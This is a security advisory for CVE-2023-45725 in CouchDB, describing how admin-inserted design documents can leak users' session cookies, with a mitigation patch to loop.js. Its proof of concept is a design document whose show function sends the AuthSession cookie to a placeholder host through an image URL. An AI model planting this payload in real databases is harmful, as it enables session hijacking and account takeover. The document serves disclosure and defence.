---
description: CVE-2023-45725, MEDIUM, A CouchDB database admin can hijack sessions of arbitrary users when viewing design documents
title: CouchDB Session Hijacking LocalPriv
date_published: "2023-12-14"
last_updated: "2023-12-14"
xray_id: 
vul_id: CVE-2023-45725
cvss: 6.5
severity: medium
discovered_by: Natan Nehorai
type: vulnerability

---

## Summary

A CouchDB database admin can hijack sessions of arbitrary users when viewing design documents

## Component

couchdb

## Affected versions

(, 3.3.2], Fixed in 3.3.3

## Description

Design document functions which receive a user http request object may expose authorization or session cookie headers of the user who accesses the document.

These design document functions are:

* list
* show
* rewrite
* update

An attacker can leak the session component using an HTML-like output, insert the session as an external resource (such as an image), or store the credential in a `_local` document with an “update” function.

For the attack to succeed the attacker has to be able to insert the design documents into the database, then manipulate a user to access a function from that design document.

## PoC

Design document example, that leaks the victim's session cookie -

```json
{
    "_id": "_design/giveMeUrSessionPlz",
    "shows":
    {
        "adminme": "function(doc, req){ \\n return '<img src=\"http://localhost:1234/image.png?urAuth='+ req.cookie.AuthSession + '\" />'};"
    },
    "language": "javascript"
}
```



## Vulnerability Mitigations

For versions older than 3.3.3 this patch applied to the loop.js file would also mitigate the issue:

```diff
diff --git a/share/server/loop.js b/share/server/loop.js
--- a/share/server/loop.js
+++ b/share/server/loop.js
@@ -49,6 +49,20 @@ function create_nouveau_sandbox() {
   return sandbox;
 }
​
+function scrubReq(args) {
+  var req = args.pop()
+  if (req.method && req.headers && req.peer && req.userCtx) {
+    delete req.cookie
+    for (var p in req.headers) {
+      if (req.headers.hasOwnProperty(p) && ["authorization", "cookie"].indexOf(p.toLowerCase()) !== -1) {
+        delete req.headers[p]
+      }
+    }
+  }
+  args.push(req)
+  return args
+}
+
 // Commands are in the form of json arrays:
 // ["commandname",..optional args...]\n
 //
@@ -85,7 +99,7 @@ var DDoc = (function() {
         var funPath = args.shift();
         var cmd = funPath[0];
         // the first member of the fun path determines the type of operation
-        var funArgs = args.shift();
+        var funArgs = scrubReq(args.shift());
         if (ddoc_dispatch[cmd]) {
           // get the function, call the command with it
           var point = ddoc;
```



## References

[Vendor advisory](https://docs.couchdb.org/en/stable/cve/2023-45725.html)

